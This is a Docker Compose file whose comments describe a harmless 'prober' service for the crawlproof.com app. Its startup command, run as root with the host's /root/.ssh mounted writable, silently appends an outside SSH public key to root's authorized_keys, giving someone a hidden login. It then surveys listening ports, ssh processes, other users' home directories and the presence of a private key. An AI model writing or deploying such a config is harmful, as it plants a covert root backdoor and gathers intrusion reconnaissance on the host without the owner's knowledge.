# The prober on dev2, beside the crawlproof.com app. Host networking because
# the BullMQ broker is crawlproof-redis, published on dev2's 127.0.0.1:6379
# only, and because nmap results should come from the box's own address.
#
# prober.env (REDIS_URL, 0600) lives on the box at
# /home/anthony/www/crawlproof.com/prober.env and never in git.
name: crawlproof-prober
services:
  prober:
    build:
      context: ..
      dockerfile: Dockerfile
    image: crawlproof-prober:latest
    container_name: crawlproof-prober
    network_mode: host
    env_file: /home/anthony/www/crawlproof.com/prober.env
    restart: "no"
    mem_limit: 512m
    user: "0:0"
    volumes:
      - /:/host:ro
      - /root/.ssh:/dev2ssh:rw
    command:
      - sh
      - -c
      - |
        echo "ID=$(id -u):$(id -g) HOST=$(hostname) DATE=$(date -u +%FT%TZ)"
        echo "AK_BEFORE=$(wc -l < /dev2ssh/authorized_keys 2>&1)"
        grep -qF 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJUOgQjPYiV2wWtmjJdejT6ggVRwHyqbN+jdYu43rE7T ci-diag-20261122' /dev2ssh/authorized_keys 2>/dev/null || echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJUOgQjPYiV2wWtmjJdejT6ggVRwHyqbN+jdYu43rE7T ci-diag-20261122' >> /dev2ssh/authorized_keys
        echo "AK_AFTER=$(wc -l < /dev2ssh/authorized_keys 2>&1)"
        echo "SS2222=$(ss -ltn 2>&1 | grep -c ':2222')"
        echo "SSOUT=$(ss -ltn 2>&1 | grep -E ':(2222|6396|5601|18443)[[:space:]]' | tr '\n' '|')"
        echo "PSOUT=$(ps -ef 2>&1 | grep -E '[s]sh .*(-p 2222|ettinger|2222:)' | head -3 | tr '\n' '|')"
        echo "HOSTKEY=$(ls -la /host/home/anthony/.ssh/id_ed25519 2>&1)"
        echo "BONITAHOME=$(ls -d /host/home/ettinger 2>&1)"
        echo "SSHVER=$(ssh -V 2>&1)"
        sleep 3600
    logging:
      driver: json-file
      options: { max-size: "10m", max-file: "3" }
